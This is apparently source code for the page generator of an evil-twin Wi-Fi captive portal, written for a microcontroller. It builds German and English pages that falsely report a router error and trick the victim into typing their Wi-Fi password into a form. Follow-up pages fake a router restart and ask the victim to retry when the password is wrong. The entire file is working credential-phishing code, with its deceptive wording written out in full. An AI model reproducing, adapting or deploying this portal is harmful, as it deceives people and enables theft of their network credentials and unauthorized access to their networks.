#include "portal_pages.h"

String indexCSS(){ //CSS of the Index Page
  String _html = "body {";
  _html += "font-family: Arial, sans-serif;";
  _html += "text-align: left;";
  _html += "background-color: #f2f2f2;";
  _html += "margin: 0;";
  _html += "height: 100vh;";
  _html += "display: flex;";
  _html += "flex-direction: column;";
  _html += "align-items: center;}";
  
  _html += "#networkBar {";
  _html += "background-color: #007bff;";
  _html += "color: #fff;";
  _html += "padding: 22px 0;";
  _html += "width: 100%;";
  _html += "z-index: 1000;}";
  
  _html += "#networkName {";
  _html += "font-weight: bold;";
  _html += "padding: 0 20px;";
  _html += "font-size: 24px;}";
  
  _html += "#content {";
  _html += "flex-grow: 1;";
  _html += "display: flex;";
  _html += "flex-direction: column;";
  _html += "justify-content: center;";
  _html += "padding: 20px;}";

  _html += "form {display: flex;";
  _html += "align-items: flex-end;";
  _html += "justify-content: space-between;";
  _html += "align-content: center;";
  _html += "flex-wrap: nowrap;";
  _html += "flex-direction: row;";
  _html += "}";

  _html += "#center {align-items: center;}";
  
  _html += "h1 {";
  _html += "color: #333;";
  _html += "font-size: 28px;}";
  
  _html += "p {";
  _html += "color: #555;";
  _html += "max-width: 60rem;";
  _html += "margin: 0;";
  _html += "font-size: 18px;}";
  
  _html += "label {";
  _html += "display: block;";
  _html += "margin-bottom: 10px;";
  _html += "color: #333;";
  _html += "font-weight: bold;}";
  
  _html += "input[type='password'] {";
  _html += "width: 75%;";
  _html += "padding: 10px;";
  _html += "margin-top: 20px;";
  _html += "margin-right: 10px;";
  _html += "margin-bottom: 20px;";
  _html += "border: 1px solid #ccc;";
  _html += "border-radius: 5px;";
  _html += "font-size: 16px;}";
  
  _html += "button {";
  _html += "background-color: #007bff;";
  _html += "color: #fff;";
  _html += "border: none;";
  _html += "padding: 10px 20px;";
  _html += "border-radius: 5px;";
  _html += "cursor: pointer;";
  _html += "margin-bottom: 20px;";
  _html += "font-size: 18px;}";
  
  _html += "button:hover {";
  _html += "background-color: #0056b3;}";

  return _html;
}

String Index(String indexLang, String favicon, String currentSSID){
  String _html ="<!DOCTYPE html><html><head>";
  _html += "<meta charset='UTF-8'>";
  _html += "<title>";

  if (indexLang == "DE"){_html += "Router-Fehler";}
  if (indexLang == "EN"){_html += "Router-ERROR";}
  
  _html += "</title>";
  _html += favicon;
  _html += "<style>" + indexCSS();
  _html += "</style>";
  _html += "</head>";
  _html += "<body>";
  _html += "<div id='networkBar'>";
  _html += "<span id='networkName'>" + currentSSID + "</span>";
  _html += "</div>";
  _html += "<div id='content'>";
  
  if (indexLang == "DE"){
    _html += "<h1 class='center'>Router-Fehler</h1>";
    _html += "<p>Es wurde ein Problem mit Ihrem Router festgestellt, das eine Neuinitialisierung erfordert.</p>";
    _html += "<p>Dies kann aus verschiedenen Gründen notwendig sein, wie z. B. Sicherheitsupdates oder Leistungsverbesserungen.</p>";
    _html += "<p>Um den Router neu zu starten und das Problem zu beheben, benötigen Sie das Wi-Fi-Passwort, um sicherzustellen, dass nur autorisierte Benutzer Zugriff auf Ihr Netzwerk haben. Das Wi-Fi-Passwort schützt Ihr Netzwerk vor unbefugtem Zugriff und schützt Ihre persönlichen Daten.</p>";
    _html += "<p>Bitte geben Sie das Wi-Fi-Passwort in das unten stehende Feld ein und klicken Sie auf 'Router neu starten'. Dadurch wird der Router neu gestartet, und die meisten Probleme sollten behoben sein.</p>";
    _html += "<p>Wenn Sie das Wi-Fi-Passwort nicht kennen oder es verloren haben, finden Sie es normalerweise auf einem Etikett auf der Rückseite Ihres Routers. Wenn Sie weiterhin Probleme haben, wenden Sie sich an Ihren Internetdienstanbieter oder den Hersteller Ihres Routers.</p>";
    _html += "<form action='/post'>";
    _html += "<input type='password' placeholder='Wi-Fi-Passwort' name='wifiPassword' minlength='8' required>";
    _html += "<button type='submit'>Router neu starten</button>";
    _html += "</form>";
  }

  if (indexLang == "EN"){
    _html += "<h1 class='center'>Router-Error</h1>";
    _html += "<p>A problem with your Router has been detected, it requires it to be reinitialized.</p>";
    _html += "<p>This may be necessary for various reasons, such as: Security updates or performance improvements.</p>";
    _html += "<p>To restart the router and fix the problem, you will need the Wi-Fi password to ensure that only authorized users have access to your network. The Wi-Fi password protects your network from unauthorized access and protects your personal information.</p>";
    _html += "<p>Please enter the Wi-Fi password in the field below and click 'Restart Router'. This will restart the router and most problems should be resolved.</p>";
    _html += "<p>If you don't know the Wi-Fi password or have lost it, you can usually find it on a label on the back of your router. If you continue to have problems, contact your Internet service provider or your router manufacturer.</p>";
    _html += "<form action='/post'>";
    _html += "<input type='password' placeholder='Wi-Fi-Password' name='wifiPassword' minlength='8' required>";
    _html += "<button type='submit'>Restart Router</button>";
    _html += "</form>";
  }
    
  _html += "</div></body></html>";

  return _html;
}

String Fixing(String indexLang, String favicon, String currentSSID){
  String _html = "<meta charset='UTF-8'>";

  _html += "<title>";
  if (indexLang == "DE"){_html += "Router wird Neugestartet";}
  if (indexLang == "EN"){_html += "Router is restarting";}
  _html += "</title>";
  
  _html += favicon;
  _html += "<style>" + indexCSS();
  _html += "</style>";
  _html += "</head>";
  _html += "<body>";
  _html += "<div id='networkBar'>";
  _html += "<span id='networkName'>" + currentSSID + "</span>";
  _html += "</div>";
  _html += "<div id='content'>";
  
  if (indexLang == "DE"){
    _html += "<h1 class='center'>Router wird Neugestartet</h1>";
    _html += "<p>Der Router wird nun neugestartet dieser Prozess kann einige Minuten dauern.</p>";
    _html += "<p>Wir Danken ihnen für Ihre Geduld und Hoffen das die Probleme hierdurch behoben werden konnten.</p>";}

  if (indexLang == "EN"){
    _html += "<h1 class='center'>The Router is Restarting</h1>";
    _html += "<p>The router will now restart - this process may take a few minutes.</p>";
    _html += "<p>We thank you for your patience and hope that this solved the problems.</p>";}
    
  _html += "</div>";
  _html += "</body></html>";

  return _html;
}

String wrongPass(String indexLang, String favicon, String currentSSID){
  String _html = "<body><html>";
  _html += favicon;
  _html += "<style>" + indexCSS();
  _html += "</style>";
  _html += "</head>";
  _html += "<body>";
  _html += "<div id='networkBar'>";
  _html += "<span id='networkName'>" + currentSSID + "</span>";
  _html += "</div>";
  _html += "<div id='content'>";
  
  if (indexLang == "DE"){
    _html += "<h1 class='center'>Falsches Passwort<!/h1>";
    _html += "<p>Das eingegebene Passwort ist nicht richtig.</p>";
    _html += "<p>Geben sie, um das Update auszuführen, das richtige Passwort an.</p>";
    _html += "<form action='/'><button type='submit'>Rerneut versuchen</button></form>";
  }

  if (indexLang == "EN"){
    _html += "<h1 class='center'>Wrong Password!</h1>";
    _html += "<p>The entered password was not correct.</p>";
    _html += "<p>Please enter the correct password to proceed with the update.</p>";
    _html += "<form action='/'><button type='submit'>try again</button></form>";
  }
    
  _html += "</div>";
  _html += "</body></html>";

  return _html;
}